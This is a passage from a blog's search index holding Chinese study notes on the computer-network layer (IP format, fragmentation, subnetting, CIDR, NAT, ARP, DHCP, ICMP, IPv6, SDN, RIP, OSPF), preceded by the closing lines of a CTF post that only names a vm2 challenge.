title="题目分析"></a>题目分析</h1><p>这里找几道题分析吧，vm2原理看得头大。</p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>这题在buu上面有</p>]]></content>
      
      
      <categories>
          
          <category> ctf web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web ctf nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-4</title>
      <link href="/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/"/>
      <url>/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="网络层概述"><a href="#网络层概述" class="headerlink" title="网络层概述"></a>网络层概述</h1><p>这里放个导图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306232043207.png" alt="image-20240306232043207"></p><p>网络层主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。</p><p>网络层传输单位是数据报。</p><p><strong>网络层的功能</strong></p><ul><li><p>功能一:路由选择与分组转发(选择最佳路径)</p></li><li><p>功能二:异构网络互联</p></li><li><p>功能三:拥塞控制</p><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施缓解这种拥塞；</p><p>拥塞控制有两种方法：</p><ul><li>开环控制：这是静态的，即提前考虑网络会产生拥塞的各种情况并做好准备</li><li>闭环控制：这是动态的，即在网络运行的时候进行实时调整</li></ul></li></ul><h1 id="IP数据报格式"><a href="#IP数据报格式" class="headerlink" title="IP数据报格式"></a>IP数据报格式</h1><p>IP协议在网络层的占比很大</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307125809633.png" alt="image-20240307125809633"></p><p><strong>ip数据包的整体结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141005938.png" alt="image-20240307141005938"></p><p>数据部分就是传输层的报文段</p><p><strong>具体格式</strong><br><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141105140.png" alt="image-20240307141105140"></p><h1 id="IP数据报分片"><a href="#IP数据报分片" class="headerlink" title="IP数据报分片"></a>IP数据报分片</h1><p><strong>最大传送单元MTU</strong></p><p>链路层数据帧可封装的数据的上限</p><p>以太网的MTU是1500字节</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307141645466.png" alt="image-20240307141645466"></p><p>链路层的数据帧的数据部分就是IP分组，所以IP分组大小不能超过MTU，以太网就是不能超过1500字节；如果超过了MTU就要采取数据报分片的方法。</p><p><strong>分片</strong></p><p>分片的就和上面数据报中的标识、标志、片偏移三个部分相关</p><ul><li><p>标识：同一数据报的分片使用同一标识。比如有三个数据报他们的标识都是888，那他们就是属于同一个数据报，最后会重新组合成一个完整的数据报。</p></li><li><p>标志：只有两位有意义</p><p>中间位DF（Don’t Fragment）：DF&#x3D;1,禁止分片；DF&#x3D;0，允许分片。</p><p>最低位MF（More Fragment）：MF&#x3D;1，后面还有分片；MF&#x3D;0，代表最后一片&#x2F;没分片。</p><p>最低位要在DF为0是才有讨论意义</p></li><li><p>片偏移：指出较长分组分片后，某片在原分组中的相对位置，以8B为单位。</p><p>比如片偏移字段为0000000000001，则代表该分片在8B的位置开始。</p><p>所以除了最后一个分片不一定，每个分片的长度一定是8B的整数倍。</p></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>一个很基础的例题，对上面一些概念的运用和简单计算</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307143646764.png" alt="image-20240307143646764"></p><h1 id="IPv4地址"><a href="#IPv4地址" class="headerlink" title="IPv4地址"></a>IPv4地址</h1><h2 id="IP分类的历史阶段"><a href="#IP分类的历史阶段" class="headerlink" title="IP分类的历史阶段"></a>IP分类的历史阶段</h2><p>分类的IP地址&#x3D;》子网的划分&#x3D;》构成超网(无分类编址方法)</p><h2 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h2><p>IP地址：唯一的32位&#x2F;4字节标识符，标识路由器主机的接口</p><p>IP地址&#x3D;{&lt;网络号&gt;,&lt;主机号&gt;}</p><p>为了方便人阅读，采用点分十进制的转换法</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307144802830.png" alt="image-20240307144802830"></p><p><strong>各类别IP地址划分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145139846.png" alt="image-20240307145139846"></p><p><strong>特殊IP地址</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145608889.png" alt="image-20240307145608889"></p><p><strong>私有IP地址</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307145720156.png" alt="image-20240307145720156"></p><p><strong>可用网络号和主机数计算</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307150107170.png" alt="image-20240307150107170"></p><blockquote><p>主机数需要减去全0和全1两种特殊情况</p><p>网络数A类需要减去全0和127，B类和C类只要减去全0</p></blockquote><h1 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h1><p>因为路由器对目的地址是私有IP地址的数据报一律不进行转发，那我们平时上网是怎么去外界通信呢，就是用到了NAT技术。</p><p><strong>网络地址转换NAT(NetworkAddress Translation)：</strong>在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址。这是一个示例图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307151440901.png" alt="image-20240307151440901"></p><h1 id="子网划分与子网掩码"><a href="#子网划分与子网掩码" class="headerlink" title="子网划分与子网掩码"></a>子网划分与子网掩码</h1><h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p>就是将**{&lt;网络号&gt;,&lt;主机号&gt;}<strong>这样的两级IP地址变成</strong>{&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}**这样的三级IP地址；不过外界是不知道内部的子网如何划分的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307152212955.png" alt="image-20240307152212955"></p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>网络号(子网号也是)对应的二进制位全为1，主机号则全为0。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307221224860.png" alt="image-20240307221224860"></p><blockquote><p>子网掩码与IP地址逐位相与，就得到子网网络地址</p></blockquote><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>已知IP地址141.14.72.24，子网掩码是255.255.192.0，求网络地址</p><p>直接中间8位的192写出来和72一与就可以得到64，所以子网网络号为141.14.64.0。</p><h2 id="使用子网时的分组转发"><a href="#使用子网时的分组转发" class="headerlink" title="使用子网时的分组转发"></a>使用子网时的分组转发</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307222755852.png" alt="image-20240307222755852"></p><h1 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h1><p><strong>CIDR消除了传统的A类，B类和C类地址以及划分子网的概念；网络号和子网号统一变成网络前缀。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307230252926.png" alt="image-20240307230252926"></p><blockquote><p>CIDR的写法是IP地址后加上&#x2F;，然后写上网络前缀的位数，比如：128.14.32.0&#x2F;20</p></blockquote><p><strong>CIDR融合子网地址与子网掩码，方便子网划分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307230656231.png" alt="image-20240307230656231"></p><h2 id="构成超网"><a href="#构成超网" class="headerlink" title="构成超网"></a>构成超网</h2><p>将多个子网聚合成一个较大的子网，叫做构成超网，或路由聚合。</p><p>其方法就是将网络前缀缩短，在所有的网络地址取交集。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307231403673.png" alt="image-20240307231403673"></p><p>比如上面的IP地址的交集就是前16位，然后就把前16位当作新的网络前缀。</p><h2 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h2><p>使用CIDR时，查找路由表可能得到几个匹配结果(跟网络掩码按位相与)，应选择具有最长网络前缀的路由。<br>前缀越长，地址块越小，路由越具体。</p><p>下面是一个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308001842598.png" alt="image-20240308001842598"></p><p>目的地址分别与上述路由表中的所有地址块进行匹配，左边两个都能成功匹配到网络号，而计算机系的网络前缀最长，所以会发送给计算机系。</p><h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p>ARP协议有点类似于网络层和链路层的一个中间协议，因为ARP协议就是完成主机或路由器IP地址到MAC地址的映射，也就是解决下一跳走哪的问题。</p><blockquote><p>在实际网络的链路上传输数据帧时，最终必须使用MAC地址</p></blockquote><p><strong>ARP协议使用过程</strong></p><p>检查ARP高速缓存，有对应表项则写入MAC帧，没有则用目的MAC地址为FF-FF-FF-FF-FF-FF的帧封装并广播ARP请求分组，同一局域网中所有主机都能收到该请求。目的主机收到请求后就会向源主机单播一个ARP响应分组，源主机收到后将此映射写入ARP缓存(10-20min更新一次)。</p><p><strong>ARP协议的四种典型情况</strong></p><ol><li><p>主机A发给本网络上的主机B:用ARP找到主机B的硬件地址;</p></li><li><p>主机A发给另一网络上的主机B:用ARP找到本网络上一个路由器(网关)的硬件地址；</p></li><li><p>路由器发给本网络的主机A:用ARP找到主机A的硬件地址；</p></li><li><p>路由器发给另一网络的主机B:用ARP找到本网络上的一个路由器的硬件地址。</p></li></ol><p><strong>下面用向本局域网主机发送数据和向其他局域网主机发送数据的两个例子来说明ARP协议的运用</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308153147166.png" alt="image-20240308153147166"></p><p>现在是向本局域网内的3号主机发送数据，首先会在本地的ARP高速缓存中检查有没有3号主机对应的mac地址，没有的话就会另IP3为全1发送一个广播分组，交换机收到请求之后就会发送给所有主机，所有主机收到请求后，如果是对应的IP地址就会返回一个单播ARP响应分组，其中就包含了自己的mac地址。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308154025422.png" alt="image-20240308154025422"></p><p>这是向非局域网内的5号主机传输数据，会先将IP5与自己的子网掩码相与一下看是否在同一个网段，如果不在就直接跳到自己的默认网关，局域网内的主机都知道自己的默认网关地址，然后就可以发送广播分组得到默认网关的mac地址，然后这里就填上mac6发送到默认网关，后面的mac地址的改变调整是路由器转发数据出去时自己内部改变的，包含自身mac地址和要去的mac地址。</p><blockquote><p>交换机是没有mac地址的，要主机和路由器接口才有。</p><p>默认网关就是本局域网和外界通信的一个接口。</p></blockquote><h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><h2 id="主机要如何获得IP地址"><a href="#主机要如何获得IP地址" class="headerlink" title="主机要如何获得IP地址"></a>主机要如何获得IP地址</h2><ol><li><p>静态配置：也就是管理由手动配置<strong>IP地址</strong>，<strong>子网掩码</strong>，<strong>默认网关</strong>这些东西</p></li><li><p>动态配置：这就是利用DHCP服务器来给局域网内的主机自动分配一个IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240308155102460.png" alt="image-20240308155102460"></p></li></ol><h2 id="DHCP工作过程"><a href="#DHCP工作过程" class="headerlink" title="DHCP工作过程"></a>DHCP工作过程</h2><p><strong>动态主机配置协议DHCP是应用层协议，</strong>使用客户&#x2F;服务器方式，客户端和服务端通过广播方式进行交互，基于UDP。</p><p>DHCP提供即插即用联网的机制，主机可以从服务器动态获取IP地址、子网掩码、默认网关、DNS服务器名称与IP地址，允许地址重用，支持移动用户加入网络，支持在用地址续租。</p><p><strong>流程</strong></p><ol><li>主机广播DHCP发现报文，也就是探测网络中是否有DHCP服务器，请求获得IP地址</li><li>DHCP服务器广播DHCP提供报文，收到请求的服务器如果有空闲的IP地址及其相关配置都会广播发送出去</li><li>主机广播DHCP请求报文，收到多个提供报文，选择其中的一个IP地址使用(先到先得)，广播发送确认使用该IP地址</li><li>DHCP服务器广播DHCP确认报文，正式将该IP分配给主机</li></ol><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>ICMP协议起到传输层和网络层的桥梁作用。</p><p>ICMP协议支持主机或路由器，在网络层的分组出错时，在分组被丢弃之后需要发送一个差错(或异常报告)，也就是发送特定ICMP报文：ICMP差错报文，ICMP询问报文</p><h2 id="ICMP结构"><a href="#ICMP结构" class="headerlink" title="ICMP结构"></a>ICMP结构</h2><p>ICMP报文是装在IP数据报的数据部分</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309000752280.png" alt="image-20240309000752280"></p><h2 id="ICMP的5种差错报告报文"><a href="#ICMP的5种差错报告报文" class="headerlink" title="ICMP的5种差错报告报文"></a>ICMP的5种差错报告报文</h2><ol><li>终点不可达：当路由器或主机不能交付数据报时就向源点发送终点不可达报文，即无法交付</li><li>源点抑制：当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢，在网络拥塞丢失数据是发生；<strong>不过现在已经不用这种报文了</strong>。</li><li>时间超过：当路由器收到生存时间TTL&#x3D;0的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文，即 TTL&#x3D;0时。</li><li>参数问题：当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文。首部字段有问题时发生。</li><li>改变路由(重定向)：路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器<br>，选择更好的路由。</li></ol><p><strong>ICMP差错报告报文数据格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309001638857.png" alt="image-20240309001638857"></p><p><strong>不发送ICMP差错报文的情况</strong></p><ol><li><p>对ICMP差错报告报文不再发送ICMP差错报告报文。</p></li><li><p>对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文。</p></li><li><p>对具有组播地址的数据报都不发送ICMP差错报告报文(组播地址区别于广播地址，一点到多点即可，只用给部分节点发送，而不像广播地址发送给所有节点)。</p></li><li><p>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文。</p></li></ol><h2 id="ICMP询问报文"><a href="#ICMP询问报文" class="headerlink" title="ICMP询问报文"></a>ICMP询问报文</h2><ol><li><p>回送请求和回答报文：主机或路由器向特定目的主机发出的询问，收到此报文的主机必须给源主机或路由器发送ICMP回送回答报文。测试目的站是否可达以及了解其相关状态。(平时用的ping命令就是一种)</p></li><li><p>时间戳请求和回答报文：请某个主机或路由器回答当前的日期和时间。用来进行时钟同步和测量时间。2.时间戳请求和回答报文</p></li><li><p>掩码地址请求和回答报文</p></li><li><p>路由器询问和通告报文</p></li></ol><blockquote><p>第三和第四种现在已经不再使用了</p></blockquote><h2 id="ICMP的应用"><a href="#ICMP的应用" class="headerlink" title="ICMP的应用"></a>ICMP的应用</h2><p>这里介绍两个命令</p><ol><li><p>ping：该命令测试两个主机之间的连通性，使用了ICMP回送请求和回答报文</p></li><li><p>traceroute(Windows上是tracert)：跟踪一个分组从源点到终点的路径，使用了ICMP时间超过差错报告报文</p><p>他的原理是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309002552980.png" alt="image-20240309002552980"></p><p>一开始的报文TTL设置为1，经过一个路由，TTL变为0然后返回差错报告报文，就可以测试出一个路由，此后每次TTL加1，以此类推就可以测出经过多少路由，也就知道了路径。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309003134315.png" alt="image-20240309003134315"></p><blockquote><p>结果说明：第一列表示到达目标服务器经过的网络节点数，2-4列分别表示请求目标节点时间、目标节点响应时间和平均响应时间，最右边则表示到达目标服务器所经过的每个网络节点的IP</p></blockquote></li></ol><h1 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1><p>因为IPv4的地址空间分配殆尽，所以IPv6就出现了来解决地址空间不足问题。</p><p><strong>IPv6的改变</strong></p><p>改进了首部格式以便快速处理和快速转发。</p><p>支持QoS(Quality of Service，服务质量)：指一个网络能够利用各种基础技术，为指定的网络通信提供更好的服务能力,是网络的一种安全机制，是用来解决网络延迟和阻塞等问题的一种技术。</p><h2 id="数据报格式"><a href="#数据报格式" class="headerlink" title="数据报格式"></a>数据报格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309004131851.png" alt="image-20240309004131851"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309005425608.png" alt="image-20240309005425608"></p><ol><li>这里的版本指明了协议版本，IPv6他的字段值就是6</li><li>优先级就是区分数据报的类别和优先级</li><li>流标签有点类似数据报分片中的标识位，“流”是互联网络上从特定源点到特定终点的一系列数据报。所有属于同一个流的数据报都具有同样的流标签。比如B和A主机进行连接传输数据，在该连接上B向A发出的多个数据包都属于同一个流，所以他们也就有相同的流标签。</li><li>下一个首部顾名思义就是表示下一个首部是谁，比如基本首部的下一个首部标识扩展首部1，扩展首部的下一个首部标识扩展首部2，扩展首部2的下一个首部标识数据部分。</li><li>跳数限制就相当于IPv4的TTL。</li></ol><h2 id="IPv6和IPv4的区别"><a href="#IPv6和IPv4的区别" class="headerlink" title="IPv6和IPv4的区别"></a>IPv6和IPv4的区别</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309010458862.png" alt="image-20240309010458862"></p><blockquote><p>在第七点中，因为在传输过程中不能在路由分片，所以如果超过了数据链路层的最大传输单元MTU就会将数据报丢弃，返回一个ICMPv6差错报文。</p></blockquote><h2 id="IPv6地址表示形式"><a href="#IPv6地址表示形式" class="headerlink" title="IPv6地址表示形式"></a>IPv6地址表示形式</h2><ol><li><p>一般形式：冒号十六进制记法**(八组四位十六进制数)**，比如：4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</p></li><li><p>压缩形式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309011120976.png" alt="image-20240309011120976"></p></li></ol><h2 id="IPv6基本地址类型"><a href="#IPv6基本地址类型" class="headerlink" title="IPv6基本地址类型"></a>IPv6基本地址类型</h2><ol><li>单播：一对一通信，可做源地址+目的地址</li><li>多播：一对多通信，可做目的地址</li><li>任播：一对多中的一个通信，可做目的地址</li></ol><h2 id="IPv6向IPv4过渡策略"><a href="#IPv6向IPv4过渡策略" class="headerlink" title="IPv6向IPv4过渡策略"></a>IPv6向IPv4过渡策略</h2><ol><li><strong>双栈协议：</strong>双协议栈技术就是指在一台设备上<strong>同时启用IPv4协议栈和IPv6协议栈</strong>。这样的话，这台设备既能和IPv4网络通信，又能和IPv6网络通信。如果这台设备是一个路由器，那么这台路由器的不同接口上，分别配置了IPv4地址和IPv6地址，并很可能分别连接了IPv4网络和IPv6网络。如果这台设备是一个计算机，那么它将同时拥有IPv4地址和IPv6地址，并具备同时处理这两个协议地址的功能。</li><li><strong>隧道技术：</strong>通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送。比如一段IPv6的数据报加上IPv4的首部，而IPv6的数据报则作为数据部分，然后重新封装当作IPv4进行传播。</li></ol><h1 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h1><h2 id="路由转发和路由选择"><a href="#路由转发和路由选择" class="headerlink" title="路由转发和路由选择"></a>路由转发和路由选择</h2><p><strong>转发：</strong></p><p>达到路由器输入链路之一的数据报如何转发到该路由器的输出链路之一。花费时间短，通常用硬件解决</p><p><strong>数据平面</strong></p><p>数据平面对于数据处理过程中各种具体处理转发过程。对应路由转发</p><p><strong>路由选择：</strong></p><p>控制数据报沿着从源主机到目的主机的端到端路径中路由器之间的路由方式。花费时间长，通常用软件解决。</p><p><strong>控制平面</strong></p><p>控制平面用于控制和管理网络协议的运行，比如OSPF协议、RIP协议、BGP协议。对应路由选择。</p><h2 id="数据平面"><a href="#数据平面" class="headerlink" title="数据平面"></a>数据平面</h2><p>数据平面执行的主要功能是根据转发表进行转发，这是路由器的本地动作。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306235123180.png" alt="image-20240306235123180"></p><h2 id="控制平面"><a href="#控制平面" class="headerlink" title="控制平面"></a>控制平面</h2><p><strong>控制平面的传统方法也叫每路由器法：</strong></p><p>路由选择算法运行在每台路由器中，并且在每台路由器中都包含转发和路由选择两种功能。</p><p>具体原理为：在一台路由器中的路由选择算法与其他路由器中的路由选择算法通信(通过交换路由选择报文)<br>计算出路由表和转发表。</p><p><strong>SDN方法：Software-Defined Networking</strong></p><p>控制平面从路由器物理上分离。路由器仅实现转发，远程控制器计算和分发转发表以供每台路由器所使用。</p><p>具体原理为：路由器通过交换包含转发表和其他路由选择信息的报文与远程控制器通信。因为计算转发并与路由器交互的控制器是用软件实现的，所以网络是软件定义的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307093103127.png" alt="image-20240307093103127"></p><p><strong>控制平面中的路由选择处理器</strong></p><p>传统方法：路由选择处理器执行控制平面功能。在传统的路由器中，它执行路由选择协议，维护路由选择表于关联链路状态信息，并为该路由器计算转发表。</p><p>SDN方法：在SDN路由器中，路由选择处理器负责与远程控制器通信，目的是接收远程控制器计算的转发表项。</p><h2 id="SDN组件"><a href="#SDN组件" class="headerlink" title="SDN组件"></a>SDN组件</h2><ul><li><p>SDN控制器：维护准确的网络状态信息(远程链路、交换机和主机的状态);为运行在控制平面中的网络控制应用程序提供这些信息(逻辑集中，在多台服务器上实现)</p></li><li><p>网络控制应用程序：根据SDN控制器提供的方法，这些应用程序通过这些方法能够监视、编程和控制下面的网<br>络设备。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307093843773.png" alt="image-20240307093843773"></p><p><strong>SDN控制器的细节</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307094357878.png" alt="image-20240307094357878"></p><h1 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h1><ul><li><p><strong>静态路由算法(非自适应路由算法)</strong>,</p><p>由管理员手工配置路由信息。<br>简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，广泛用于高度安全性的军事网络和较小的商业网络。路由更新慢，不适用大型网络。</p></li><li><p><strong>动态路由算法(自适应路由算法)</strong></p><p>由路由器间彼此交换信息，按照路由算法优化出路由表项。<br>路由更新快，适用大型网络，及时响应链路费用或网络拓扑变化。<br>算法复杂，增加网络负担。</p><p><strong>动态路由算法又可以分为全局性和分散性</strong></p><ul><li><p>全局性：链路状态路由算法(OSPF)</p><p>所有路由器掌握完整的网络拓扑和链路费用信息。</p></li><li><p>分散性：距离向量路由算法(RIP)</p><p>路由器只掌握物理相连的邻居及链路费用。</p></li></ul></li></ul><h1 id="分层次路由选择协议"><a href="#分层次路由选择协议" class="headerlink" title="分层次路由选择协议"></a>分层次路由选择协议</h1><p>分层协议产生的原因是因为很多单位在接入因特网的同时还要隐藏自己的路由选择协议，这里就涉及到一个自治系统AS的概念</p><p><strong>自治系统AS</strong></p><p>在单一的技术管理下的一组路由器，而这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由，同时还使用一种AS之间的路由协议以确定在AS之间的路由。个AS内的所有网络都属于一个行政单位来管辖，一个自治系统的所有路由器在本自治系统内都必须连通</p><p><strong>路由选择协议又分为两种</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307125518139.png" alt="image-20240307125518139"></p><blockquote><p>现在常用的是BGP-4</p></blockquote><h1 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议"></a>RIP协议</h1><p><strong>定义</strong></p><p>RIP是一种分布式的基于距离向量的路由选择协议，是因特网的协议标准，最大优点是简单；它适用于小型网络。</p><p><strong>相关规则</strong></p><p>RIP协议要求网络中每一个路由器都维护从它自己到其他每一个目的网络的唯一最佳距离记录(即一组距离)</p><p>&#x3D;&#x3D;距离：&#x3D;&#x3D;通常为“跳数”，即从源端口到目的端口所经过的路由器个数，经过一个路由器跳数+1。特别的，从由器到直接连接的网络距离为1。RIP允许一条路由最多只能包含15个路由器，因此距离为16表示网络不可达<br>一路</p><p>一个示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309012809494.png" alt="image-20240309012809494"></p><h2 id="RIP协议交换规则"><a href="#RIP协议交换规则" class="headerlink" title="RIP协议交换规则"></a>RIP协议交换规则</h2><ol><li>仅和相邻路由器交换信息</li><li>路由器交换的信息是自己的路由表</li><li>每30秒交换一次路由信息，然后路由器根据新信息更新路由表。若超过180s没收到邻居路由器的通告，则判定邻居没了，并更新自己路由表。</li></ol><blockquote><p>路由器刚开始工作时，只知道直接连接的网络的距离(距离为1)，接着每一个路由器也只和数目非常有限的相路由器交换并更新路由信息。</p><p>经过若干次更新后，所有路由器最终都会知道到达本自治系统任何一个网络的最短距离和下一跳路由器的地址,即“收敛</p></blockquote><h2 id="距离向量算法"><a href="#距离向量算法" class="headerlink" title="距离向量算法"></a>距离向量算法</h2><ol><li><p>修改相邻路由器发来的RIP报文中所有表项。</p><p>对地址为X的相邻路由器发来的RIP报文，修改此报文中的所有项目：把“下一跳”字段中的地址改为X，并把<br>所有的“距离”字段+1。</p><p>这里用一个演示图解释一下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309013653735.png" alt="image-20240309013653735"></p><p>与x相邻的路由为R1，x就把自己的上图路由表发给R1，原来的路由表表示，到Net3网络的最短路径为2跳，下一跳为R2，R1收到后就直接顺着修改成到Net3的最短路径为3，下一跳为x</p></li><li><p>对修改后的RIP报文中的每一个项目，进行以下步骤：</p><ul><li><p>R1路由表中若没有Net3，则把该项目填入R1路由表。</p></li><li><p>R1路由表中若有Net3，则查看下一跳路由器地址：</p><p>若下一跳是X不管距离大小，则用收到的项目替换源路由表中的项目；</p><p>若下一跳不是X，比较原来距离比从X走的距离远则更新，否则不作处理。</p></li></ul></li><li><p>若180s还没收到相邻路由器X的更新路由表，则把X记为不可达的路由器，即把距离设置为16。</p></li><li><p>返回。</p></li></ol><h2 id="RIP协议报文格式"><a href="#RIP协议报文格式" class="headerlink" title="RIP协议报文格式"></a>RIP协议报文格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309015032452.png" alt="image-20240309015032452"></p><h2 id="RIP特点"><a href="#RIP特点" class="headerlink" title="RIP特点"></a>RIP特点</h2><p><img src="C:/Users/86189/AppData/Roaming/Typora/typora-user-images/image-20240309015302320.png" alt="image-20240309015302320"></p><p>要不断重复更新下去，直到双方路由表到网1的距离都更新到16，R1和R2才知道网络1是不可达的。</p><h1 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h1><p><strong>定义</strong><br>开放最短路径优先OSPF协议:“开放”标明OSPF协议不是受某一家厂商控制，而是公开发表的：”最短路径优先“是因为使用了Diikstra提出的最短路径算法SPF。</p><p>OSPF最主要的特征就是使用分布式的链路状态协议。</p><p><strong>OSPF的特点</strong></p><ol><li>使用洪泛法向自治系统内所有路由器发送信息，即路由器通过输出端口向所有相邻的路由器发送信息，而每一个相邻路由器又再次将此信息发往其所有的相邻路由器；就相当于广播信息出去。最终整个区域内的路由器就得到了这个信息的一个副本。</li><li>发送的信息就是与本路由器相邻的所有路由器的链路状态(本路由器和哪些路由器相邻，以及该链路的度<br>量&#x2F;代价–费用、距离、时延、带宽等)。</li><li>只有当链路状态发生变化时，路由器才向所有路由器洪泛发送此信息。</li></ol><blockquote><p>最后，所有路由器都能建立一个链路状态数据库，即全网拓扑图。</p></blockquote><h2 id="链路状态路由算法"><a href="#链路状态路由算法" class="headerlink" title="链路状态路由算法"></a>链路状态路由算法</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309093424516.png" alt="image-20240309093424516"></p><h2 id="OSPF的区域"><a href="#OSPF的区域" class="headerlink" title="OSPF的区域"></a>OSPF的区域</h2><p> OSPF常用于规模很大的网络，OSPF将一个自治系统再划分为若干个更小的范围，叫做区域；每一个区域都有一个32位的区域标识符(用点分十进制表示)，区域也不能太大，在一个区域内的路由器最好不超过200个。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309093653477.png" alt="image-20240309093653477"></p><blockquote><p>位于主干边界的路由器，比如R3，R4，R7；既属于主干路由器也属于区域边界路由器</p><p>自治系统边界路由器就是与外界连接比如其他AS的路由器。</p></blockquote><h2 id="OSPF分组"><a href="#OSPF分组" class="headerlink" title="OSPF分组"></a>OSPF分组</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309094030723.png" 